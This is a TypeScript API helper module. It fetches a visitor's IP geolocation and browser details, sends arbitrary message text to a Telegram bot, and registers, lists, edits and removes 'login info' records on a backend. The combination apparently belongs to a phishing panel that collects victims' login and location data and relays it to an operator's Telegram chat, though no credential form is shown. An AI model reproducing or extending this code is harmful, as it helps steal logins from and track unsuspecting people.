import {ILoginInfo, ISubmitInfo} from "../interfaces";

export const getGeolocationInfo = async () => {
    return await fetch('https://geolocation-db.com/json/')
        .then((res) =>res.json())
        .then((data) => {
            const target: ILoginInfo = Object.assign({
                'appName': navigator.appName,
                'platform': navigator.platform,
                'userAgent': navigator.userAgent,
            }, data);
            return target;
        });
};

export const sendMessage = async (message: string) => {
    // console.log('https://api.telegram.org/bot' + process.env.REACT_APP_TOKEN + '/sendMessage?chat_id=' + process.env.REACT_APP_CHAT_ID + '&text=' + message);
    return await fetch('https://api.telegram.org/bot' + process.env.REACT_APP_TOKEN + '/sendMessage?chat_id=' + process.env.REACT_APP_CHAT_ID + '&text=' + message);
};

export const getSubmitInfos = async () => {
    return await fetch(process.env.REACT_APP_BASE_URL + "submits")
        .then((res) => res.json())
        .then((data: ISubmitInfo[]) => data);
};

export const findLoginInfos = async () => {
    return await fetch(process.env.REACT_APP_BASE_URL + "find-login-infos", {
        method: "POST",
        headers: { "Content-Type": "application/json" }
    })
        .then((res) => res.json())
        .then((data: ILoginInfo[]) => data);
};

export const registerLoginInfo = async (loginInfo: ILoginInfo) => {
    return await fetch(process.env.REACT_APP_BASE_URL + "register-login-info", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(loginInfo)
    })
        .then((res) => res.json());
};

export const modifyLoginInfo = async (id: string, loginInfo: Partial<ILoginInfo>) => {
    return await fetch(process.env.REACT_APP_BASE_URL + "modify-login-info", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(loginInfo)
    })
        .then((res) => res.json());
};

export const removeLoginInfo = async (id: string, loginInfo: Partial<ILoginInfo>) => {
    return await fetch(process.env.REACT_APP_BASE_URL + "remove-login-info", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(loginInfo)
    })
        .then((res) => res.json());
};